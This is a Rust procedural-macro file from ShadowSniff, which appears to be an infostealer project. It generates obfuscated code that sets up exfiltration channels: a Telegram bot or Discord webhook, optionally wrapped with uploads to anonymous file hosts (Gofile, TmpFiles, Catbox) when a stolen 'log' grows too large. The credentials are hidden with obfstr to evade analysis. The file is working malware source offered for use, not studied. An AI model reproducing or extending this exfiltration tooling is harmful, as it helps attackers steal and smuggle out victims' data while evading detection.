/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use proc_macro2::TokenStream;
use quote::quote;
use sender::discord_webhook::DiscordWebhookSender;
use sender::telegram_bot::TelegramBotSender;
use crate::send_settings::{SendSettings, UploaderService, UploaderUsecase};
use crate::sender_service::SenderService;

fn gen_base_sender(service: SenderService) -> TokenStream {
    match service {
        SenderService::TelegramBot(TelegramBotSender { token, chat_id }) => {
            let token = &*token;
            let chat_id = &*chat_id;

            quote! {
                sender::telegram_bot::TelegramBotSender::new(
                    obfstr::obfstr!(#token),
                    obfstr::obfstr!(#chat_id),
                )
            }
        },
        SenderService::DiscordWebhook(DiscordWebhookSender { webhook }) => {
            let webhook = &*webhook;
            quote! {
                sender::discord_webhook::DiscordWebhookSender::new(
                    obfstr::obfstr!(#webhook),
                )
            }
        }
    }
}

fn gen_uploader_wrapper(uploader: UploaderService, base: TokenStream) -> TokenStream {
    match uploader {
        UploaderService::Gofile => quote! {
            sender::gofile::GofileUploader::new(#base)
        },
        UploaderService::TmpFiles => quote! {
            sender::tmpfiles::TmpFilesUploader::new(#base)
        },
        UploaderService::Catbox => quote! {
            sender::catbox::CatboxUploader::new(#base)
        }
    }
}

impl SendSettings {
    pub fn gen_expr(&self) -> TokenStream {
        let expr = self.expr_internal();

        quote! {
            {
                #expr
            }
        }
    }

    fn expr_internal(&self) -> TokenStream {
        let base = gen_base_sender(self.service.clone());

        let Some((service, usecase)) = self.uploader.clone() else {
            return base
        };

        match usecase.clone() {
            UploaderUsecase::Always => gen_uploader_wrapper(service, base),
            UploaderUsecase::WhenLogExceedsLimit => {
                let sender_clone = quote! { sender.clone() };
                let wrapper_tokens = gen_uploader_wrapper(service, sender_clone);

                quote! {
                    let sender = #base;
                    let wrapper = #wrapper_tokens;

                    sender::size_fallback::SizeFallbackSender::new(sender, wrapper)
                }
            }
        }
    }
}